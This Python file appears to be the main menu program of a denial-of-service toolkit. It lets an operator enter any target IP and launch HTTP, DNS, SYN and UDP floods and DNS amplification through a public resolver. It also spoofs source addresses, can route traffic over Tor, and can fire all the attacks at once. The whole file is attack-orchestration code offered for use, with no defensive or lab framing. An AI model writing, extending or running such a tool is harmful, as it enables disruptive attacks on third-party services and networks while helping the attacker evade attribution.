import logging
import sys
from attack_manager import AttackManager
from httpFlod.http_flood import HttpFlood
from dnsFlod.dns_flood import DnsFlood
from udpFlod.udp_flood import UdpFlood
from synFlod.syn_flood import SynFlood
from dnsAmplificationFlod.dns_aplification import DnsAmplification
from tor_integration import check_tor_connection
from colorama import init, Fore, Style

class Main:
    def __init__(self):
        self.attack_manager = AttackManager()
        self.use_tor = False

    def menu(self):
        print("=== Attack Menu ===")
        print("1. Run HTTP Flood Attack")
        print("2. Run DNS Flood Attack")
        print("3. Run SYN Flood Attack")
        print("4. Run UDP Flood Attack")
        print("5. Run DnsAmplification")
        print("6. Connect Tor?")
        print("7. Run All Attacks")
        print("8. View Status of Active Attacks")
        print("9. Shutdown All Attacks")
        print("10. Exit")

    def run(self):
        logging.info("Starting application")

        try:
            while True:
                self.menu()
                choice = input("Enter your choice: ")

                if choice == "1":
                    self.run_http_flood_attack()
                elif choice == "2":
                    self.run_dns_flood_attack()
                elif choice == "3":
                    self.run_syn_flood_attack()
                elif choice == "4":
                    self.run_udp_flood_attack()
                elif choice == "5":
                    self.run_dns_amplification_attack()
                elif choice == "6":
                    self.connect_to_tor()
                elif choice == "7":
                    self.run_all_attacks()
                elif choice == "8":
                    self.view_status()
                elif choice == "9":
                    self.shutdown_all_attacks()
                elif choice == "10":
                    print("Exiting...")
                    break
                else:
                    print("Invalid choice. Please enter a valid option.")

        except KeyboardInterrupt:
            logging.info("Received Ctrl+C. Shutting down...")
            self.shutdown_all_attacks()
            sys.exit(0)

    def run_http_flood_attack(self):
        target_ip, target_port, thread_count = self.get_attack_parameters()
        if target_ip and target_port and thread_count:
            http_flood = HttpFlood(target_ip, target_port, self.use_tor)
            self.attack_manager.run_attack(http_flood, thread_count)

    def run_dns_flood_attack(self):
        target_ip, target_port, thread_count = self.get_attack_parameters()
        if target_ip and target_port and thread_count:
            extensions = ["com", "xyz", "me", "top", "id", "net", "org", "info", "world", "click"]
             
            dns_flood = DnsFlood(target_ip, target_port, extensions, max_packets=50000, max_duration=30, interval_range=(0.01, 0.1), log_to_file=True, spoof_ip=True)
            self.attack_manager.run_attack(dns_flood, thread_count)

    def run_syn_flood_attack(self):
        target_ip, target_port, thread_count = self.get_attack_parameters()
        if target_ip and target_port and thread_count:
            num_syns = 1000
            interval = 0.1
            syn_flood = SynFlood(target_ip, target_port, num_syns, interval)
            self.attack_manager.run_attack(syn_flood, thread_count)

    def run_udp_flood_attack(self):
        target_ip, target_port, thread_count = self.get_attack_parameters()
        if target_ip and target_port and thread_count:
            packet_size = 1024
            udp_flood = UdpFlood(target_ip, target_port, packet_size)
            self.attack_manager.run_attack(udp_flood, thread_count)
      
    def run_dns_amplification_attack(self):
        target_ip = input("Enter target IP: ")
        dns_server_ip = input("Enter DNS server IP: ")
        thread_count = int(input("Enter number of threads: "))

        dns_amplification = DnsAmplification(target_ip, dns_server_ip, num_threads=thread_count)
        self.attack_manager.run_attack(dns_amplification, thread_count)


    def connect_to_tor(self):
        tor_connected = check_tor_connection()
        if tor_connected:
            self.use_tor = True
            print("Connected to Tor successfully.")
        else:
            print("Failed to connect to Tor.")

    def run_all_attacks(self):
        target_ip = input("Enter target IP: ")
        thread_count = int(input("Enter number of threads per attack: "))

        http_flood = HttpFlood(target_ip, 80, self.use_tor)
       # extensions = ["com", "xyz", "me", "top", "id", "net", "org", "info"]
        extensions = ["com"]
        dns_flood = DnsFlood(target_ip, 53, extensions, max_packets=50000, max_duration=30, interval_range=(0.01, 0.1), log_to_file=True, spoof_ip=True)
        udp_flood = UdpFlood(target_ip, 53, packet_size=6024)
        syn_flood = SynFlood(target_ip, 53, 10000, 0.1)
        dns_amplification = DnsAmplification(target_ip, '8.8.8.8', 53, thread_count, 6024)
        attacks = [http_flood, dns_flood, udp_flood, syn_flood, dns_amplification]
        self.attack_manager.run_all_attacks(attacks, thread_count)

    def shutdown_all_attacks(self):
        self.attack_manager.shutdown()

    def view_status(self):
        status = self.attack_manager.get_status()
        if not status:
            print("No active attacks.")
        else:
            for attack_id, info in status.items():
                print(f"Attack ID: {attack_id}")
                print(f"  Target IP: {info['target_ip']}")
                print(f"  Target Port: {info['target_port']}")
                print(f"  Running: {'Yes' if info['is_running'] else 'No'}")

    def get_attack_parameters(self):
        target_ip = input("Enter target IP: ")
        target_port = int(input("Enter target port: "))
        thread_count = int(input("Enter number of threads: "))
        return target_ip, target_port, thread_count

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

    main_app = Main()
    try:
        main_app.run()
    except KeyboardInterrupt:
        logging.info("Received Ctrl+C. Shutting down...")
        main_app.shutdown_all_attacks()
        sys.exit(0)
